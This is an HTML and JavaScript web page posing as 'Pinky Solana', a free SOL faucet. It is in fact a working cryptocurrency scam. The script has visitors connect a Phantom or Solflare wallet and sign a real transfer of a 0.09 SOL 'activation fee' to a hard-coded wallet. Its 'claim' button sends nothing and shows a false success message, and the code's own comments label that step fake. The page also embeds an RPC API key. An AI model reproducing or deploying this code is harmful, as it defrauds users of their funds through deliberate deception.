<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pinky Solana - Free SOL Faucet</title>
    <!-- Fixed Buffer polyfill with multiple fallbacks -->
    <script>
        if (typeof Buffer === 'undefined') {
            window.global = window;
            document.write('<script src="https://cdnjs.cloudflare.com/ajax/libs/buffer/6.0.3/buffer.min.js"><\/script>');
        }
    </script>
    <script src="https://unpkg.com/@solana/web3.js@1.70.1/lib/index.iife.min.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .blink {
            animation: blinker 1.5s linear infinite;
        }
        @keyframes blinker {
            50% { opacity: 0.3; }
        }
        .gradient-bg {
            background: linear-gradient(135deg, #9945FF 0%, #14F195 100%);
        }
    </style>
</head>
<body class="bg-gray-900 text-white min-h-screen">
    <div class="container mx-auto px-4 py-12 max-w-3xl">
        <!-- Header -->
        <header class="flex items-center justify-center mb-12">
            <div class="w-12 h-12 mr-3 gradient-bg rounded-full flex items-center justify-center">
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="25" viewBox="0 0 24 25">
                    <path fill="white" d="M16.886 9.468a.47.47 0 0 1-.313.124H5.584c-.39 0-.587-.446-.317-.707l1.805-1.74a.46.46 0 0 1 .312-.129h11.032c.394 0 .587.45.313.712zm0 8.576a.47.47 0 0 1-.313.12H5.584c-.39 0-.587-.442-.317-.703l1.805-1.745a.45.45 0 0 1 .312-.124h11.032c.394 0 .587.446.313.707zm0-6.618a.47.47 0 0 0-.313-.12H5.584c-.39 0-.587.442-.317.703l1.805 1.745a.47.47 0 0 0 .312.124h11.032c.394 0 .587-.446.313-.707z"/>
                </svg>
            </div>
            <h1 class="text-4xl font-bold">Pinky Solana</h1>
        </header>

        <!-- Main Card -->
        <div class="bg-gray-800 rounded-2xl shadow-xl p-8 mb-8">
            <h2 class="text-2xl font-bold mb-6 text-center">Claim 0.1 SOL Every 30 Minutes!</h2>
            
            <div id="stateContainer">
                <!-- States will be injected here -->
            </div>
        </div>

        <!-- Footer -->
        <footer class="text-center text-gray-500 text-sm">
            <p>Connect with Phantom or Solflare wallet. Works on Solana Devnet.</p>
            <p class="mt-2">Pinky Solana © 2023 - The future of free SOL distribution</p>
        </footer>
    </div>

    <script>
        // Configuration
        const FEE_AMOUNT = 0.09; // SOL
        const REWARD_AMOUNT = 0.1; // SOL (fake)
        const COOLDOWN_MINUTES = 30; // minutes
        const FEE_RECEIVER = 'FtLHJ5FxWEXpuQpUEig8FbUwh3gnTMSGjN6zyjEaEcgc';
        const RPC_URL = 'https://solana-devnet.g.alchemy.com/v2/SzbcanXw4jH5Wn8oZV0qm';
        
        // App state
        let walletConnected = false;
        let walletAddress = '';
        let accountActivated = false;
        let lastClaimTime = 0;
        let countdownInterval = null;
        
        // DOM Elements
        const stateContainer = document.getElementById('stateContainer');
        const connection = new solanaWeb3.Connection(RPC_URL);
        
        // Render states
        function renderState() {
            if (!walletConnected) {
                stateContainer.innerHTML = `
                    <div class="text-center">
                        <p class="mb-6">Connect your wallet to start claiming free SOL every 30 minutes!</p>
                        <button id="connectBtn" class="gradient-bg hover:opacity-90 text-white font-bold py-3 px-8 rounded-full text-lg transition">
                            Connect Wallet
                        </button>
                        <div class="mt-8 p-4 bg-gray-700 rounded-lg">
                            <h3 class="font-bold mb-2">How it works:</h3>
                            <ul class="text-left list-disc pl-5 space-y-1">
                                <li>Pay one-time activation fee (0.09 SOL)</li>
                                <li>Claim 0.1 SOL every 30 minutes forever</li>
                                <li>Works with Phantom and Solflare</li>
                                <li>Instant withdrawals to your wallet</li>
                            </ul>
                        </div>
                    </div>
                `;
                document.getElementById('connectBtn').addEventListener('click', connectWallet);
                return;
            }
            
            if (!accountActivated) {
                stateContainer.innerHTML = `
                    <div class="text-center">
                        <p class="mb-2">Connected: <span class="font-mono text-blue-400">${walletAddress.slice(0, 6)}...${walletAddress.slice(-4)}</span></p>
                        <p class="mb-6">Activate your account to start claiming free SOL!</p>
                        <div class="bg-yellow-900 border border-yellow-700 rounded-lg p-4 mb-6">
                            <p class="font-bold text-yellow-300">Activation Fee: ${FEE_AMOUNT} SOL</p>
                            <p class="text-sm mt-1">One-time payment • Non-refundable</p>
                        </div>
                        <button id="activateBtn" class="gradient-bg hover:opacity-90 text-white font-bold py-3 px-8 rounded-full text-lg transition">
                            Activate Account
                        </button>
                    </div>
                `;
                document.getElementById('activateBtn').addEventListener('click', activateAccount);
                return;
            }
            
            // Account activated state
            const now = Date.now();
            const timeSinceLastClaim = Math.floor((now - lastClaimTime) / 1000);
            const cooldownSeconds = COOLDOWN_MINUTES * 60;
            const secondsLeft = Math.max(0, cooldownSeconds - timeSinceLastClaim);
            
            stateContainer.innerHTML = `
                <div class="text-center">
                    <p class="mb-2">Account Status: <span class="text-green-400 font-bold">ACTIVE</span></p>
                    <p class="mb-2">Next Reward: <span class="text-purple-400 font-bold">0.1 SOL</span></p>
                    
                    <div class="mt-8 mb-8">
                        <div class="text-3xl font-bold mb-2" id="countdown">
                            ${formatTime(secondsLeft)}
                        </div>
                        <p>until next claim</p>
                    </div>
                    
                    <button id="claimBtn" class="gradient-bg hover:opacity-90 text-white font-bold py-3 px-8 rounded-full text-lg transition mb-4">
                        Claim SOL
                    </button>
                    <p class="text-sm text-gray-400">You can claim 0.1 SOL every 30 minutes</p>
                    
                    <div class="mt-8 p-4 bg-gray-700 rounded-lg">
                        <h3 class="font-bold mb-2">Account Benefits:</h3>
                        <ul class="text-left list-disc pl-5 space-y-1">
                            <li>Lifetime access to free SOL</li>
                            <li>No withdrawal limits</li>
                            <li>Priority support</li>
                            <li>Exclusive airdrops</li>
                        </ul>
                    </div>
                </div>
            `;
            
            // Start countdown if needed
            if (secondsLeft > 0) {
                startCountdown();
            } else {
                document.getElementById('countdown').textContent = 'READY TO CLAIM!';
                document.getElementById('countdown').classList.add('text-green-400', 'blink');
            }
            
            document.getElementById('claimBtn').addEventListener('click', claimReward);
        }
        
        // Format time for countdown
        function formatTime(seconds) {
            const mins = Math.floor(seconds / 60);
            const secs = seconds % 60;
            return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
        }
        
        // Start countdown timer
        function startCountdown() {
            if (countdownInterval) clearInterval(countdownInterval);
            
            countdownInterval = setInterval(() => {
                const now = Date.now();
                const timeSinceLastClaim = Math.floor((now - lastClaimTime) / 1000);
                const cooldownSeconds = COOLDOWN_MINUTES * 60;
                const secondsLeft = Math.max(0, cooldownSeconds - timeSinceLastClaim);
                
                if (secondsLeft <= 0) {
                    clearInterval(countdownInterval);
                    document.getElementById('countdown').textContent = 'READY TO CLAIM!';
                    document.getElementById('countdown').classList.add('text-green-400', 'blink');
                    return;
                }
                
                document.getElementById('countdown').textContent = formatTime(secondsLeft);
            }, 1000);
        }
        
        // Connect wallet handler
        async function connectWallet() {
            if (window.solana && window.solana.isPhantom) {
                try {
                    const resp = await window.solana.connect();
                    walletAddress = resp.publicKey.toString();
                    walletConnected = true;
                    
                    // Check if already activated (in localStorage)
                    const activated = localStorage.getItem('pinky_activated');
                    if (activated) {
                        accountActivated = true;
                        lastClaimTime = parseInt(localStorage.getItem('last_claim_time') || '0');
                    }
                    
                    renderState();
                } catch (err) {
                    alert('Wallet connection failed: ' + err.message);
                }
            } else if (window.solflare && window.solflare.isSolflare) {
                try {
                    await window.solflare.connect();
                    walletAddress = window.solflare.publicKey.toString();
                    walletConnected = true;
                    
                    const activated = localStorage.getItem('pinky_activated');
                    if (activated) {
                        accountActivated = true;
                        lastClaimTime = parseInt(localStorage.getItem('last_claim_time') || '0');
                    }
                    
                    renderState();
                } catch (err) {
                    alert('Wallet connection failed: ' + err.message);
                }
            } else {
                alert('Solana wallet not found! Install Phantom or Solflare.');
            }
        }
        
        // Buffer fallback function
        function ensureBufferCompatibility() {
            if (typeof Buffer !== 'undefined' && typeof Buffer.from === 'function') {
                return true;
            }
            
            // Fallback 1: Try to load from CDN again
            if (typeof window.Buffer === 'undefined') {
                const script = document.createElement('script');
                script.src = 'https://cdnjs.cloudflare.com/ajax/libs/buffer/6.0.3/buffer.min.js';
                document.head.appendChild(script);
                return false;
            }
            
            // Fallback 2: Manual Buffer implementation
            if (typeof window.Buffer === 'undefined') {
                window.Buffer = {
                    from: function(data, encoding) {
                        const encoder = new TextEncoder();
                        return encoder.encode(data);
                    }
                };
            }
            
            return true;
        }
        
        // Activate account (charge fee) with buffer fallbacks
        async function activateAccount() {
            if (!walletConnected) return;
            
            try {
                // Ensure buffer compatibility
                if (!ensureBufferCompatibility()) {
                    throw new Error('Buffer initialization failed. Please refresh the page.');
                }
                
                const receiver = new solanaWeb3.PublicKey(FEE_RECEIVER);
                const sender = new solanaWeb3.PublicKey(walletAddress);
                
                // Create transaction
                const transaction = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: sender,
                        toPubkey: receiver,
                        lamports: solanaWeb3.LAMPORTS_PER_SOL * FEE_AMOUNT
                    })
                );
                
                // Get recent blockhash
                const { blockhash } = await connection.getRecentBlockhash();
                transaction.recentBlockhash = blockhash;
                transaction.feePayer = sender;
                
                // Sign transaction
                let signed;
                if (window.solana && window.solana.isPhantom) {
                    signed = await window.solana.signTransaction(transaction);
                } else if (window.solflare && window.solflare.isSolflare) {
                    signed = await window.solflare.signTransaction(transaction);
                } else {
                    throw new Error('Wallet not connected');
                }
                
                // Send transaction
                const rawTransaction = signed.serialize();
                const txid = await connection.sendRawTransaction(rawTransaction);
                await connection.confirmTransaction(txid);
                
                // Update state
                accountActivated = true;
                lastClaimTime = Date.now();
                localStorage.setItem('pinky_activated', 'true');
                localStorage.setItem('last_claim_time', lastClaimTime.toString());
                
                renderState();
                
            } catch (err) {
                alert('Activation failed: ' + err.message);
            }
        }
        
        // Claim reward (does nothing)
        function claimReward() {
            const now = Date.now();
            const timeSinceLastClaim = Math.floor((now - lastClaimTime) / 1000);
            const cooldownSeconds = COOLDOWN_MINUTES * 60;
            
            if (timeSinceLastClaim < cooldownSeconds) {
                alert(`Please wait ${formatTime(cooldownSeconds - timeSinceLastClaim)} before claiming again`);
                return;
            }
            
            // Fake claim - just update timer
            lastClaimTime = Date.now();
            localStorage.setItem('last_claim_time', lastClaimTime.toString());
            
            // Show fake success message
            alert('Success! 0.1 SOL has been sent to your wallet. Next claim available in 30 minutes.');
            
            renderState();
        }
        
        // Initialize
        function init() {
            // Check if already activated
            const activated = localStorage.getItem('pinky_activated');
            if (activated) {
                accountActivated = true;
                lastClaimTime = parseInt(localStorage.getItem('last_claim_time') || '0');
            }
            
            // Auto-connect if wallet is already connected
            if ((window.solana && window.solana.isConnected) || 
                (window.solflare && window.solflare.isConnected)) {
                connectWallet();
            } else {
                renderState();
            }
        }
        
        // Event listeners for wallet changes
        if (window.solana) {
            window.solana.on('connect', () => {
                walletAddress = window.solana.publicKey.toString();
                walletConnected = true;
                renderState();
            });
            
            window.solana.on('disconnect', () => {
                walletConnected = false;
                renderState();
            });
        }
        
        if (window.solflare) {
            window.solflare.on('connect', () => {
                walletAddress = window.solflare.publicKey.toString();
                walletConnected = true;
                renderState();
            });
            
            window.solflare.on('disconnect', () => {
                walletConnected = false;
                renderState();
            });
        }
        
        // Initialize app
        window.addEventListener('DOMContentLoaded', init);
    </script>
</body>
</html>
